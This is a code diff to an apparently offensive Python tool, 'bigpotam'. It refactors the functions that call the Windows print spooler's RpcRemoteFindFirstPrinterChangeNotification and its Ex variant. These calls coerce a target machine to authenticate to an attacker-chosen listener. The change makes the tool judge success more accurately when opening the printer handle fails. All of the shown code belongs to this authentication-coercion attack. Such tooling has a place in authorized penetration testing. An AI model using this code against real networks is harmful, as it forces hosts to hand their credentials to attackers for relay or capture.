@@ -11,6 +11,7 @@ from bigpotam.structures import RpcRemoteFindFirstPrinterChangeNotification
 
 log = logging.getLogger("bigpotam")
 
+# Result codes of the notification call itself, after RpcOpenPrinter worked.
 # rpc_s_access_denied=0x05, ERROR_BAD_NETPATH=0x35, RPC_S_SERVER_UNAVAILABLE=0x6BA
 _SUCCESS_CODES = {0x00000005, 0x00000035, 0x000006BA}
 _SUCCESS_STRINGS = (
@@ -24,12 +25,27 @@ def _check_success(e):
     return check_error(e, _SUCCESS_CODES, _SUCCESS_STRINGS)
 
 
+def _open_printer(dce, target, name):
+    """Get a printer handle, or None if RpcOpenPrinter fails.
+
+    A failed RpcOpenPrinter (e.g. rpc_s_access_denied on an unauthenticated
+    bind) means the notification call never ran, so it is not a success.
+    """
+    try:
+        return rprn.hRpcOpenPrinter(dce, f"\\\\{target}\x00")["pHandle"]
+    except Exception as e:
+        log.debug("%s: RpcOpenPrinter failed: %s", name, e)
+        return None
+
+
 def trigger_rprn_notification(dce, listener, listener_port=445, target=None, **kw):
     """RpcRemoteFindFirstPrinterChangeNotification (opnum 62)."""
+    handle = _open_printer(dce, target, "RpcRemoteFindFirstPrinterChangeNotification")
+    if handle is None:
+        return False
     try:
-        resp = rprn.hRpcOpenPrinter(dce, f"\\\\{target}\x00")
         request = RpcRemoteFindFirstPrinterChangeNotification()
-        request["hPrinter"] = resp["pHandle"]
+        request["hPrinter"] = handle
         request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
         request["fdwOptions"] = 0x00000000
         request["pszLocalMachine"] = rprn_path(listener, listener_port)
@@ -47,10 +63,12 @@ def trigger_rprn_notification(dce, listener, listener_port=445, target=None, **k
 
 def trigger_rprn_notification_ex(dce, listener, listener_port=445, target=None, **kw):
     """RpcRemoteFindFirstPrinterChangeNotificationEx (opnum 65)."""
+    handle = _open_printer(dce, target, "RpcRemoteFindFirstPrinterChangeNotificationEx")
+    if handle is None:
+        return False
     try:
-        resp = rprn.hRpcOpenPrinter(dce, f"\\\\{target}\x00")
         request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
-        request["hPrinter"] = resp["pHandle"]
+        request["hPrinter"] = handle
         request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
         request["fdwOptions"] = 0x00000000
         request["pszLocalMachine"] = rprn_path(listener, listener_port)
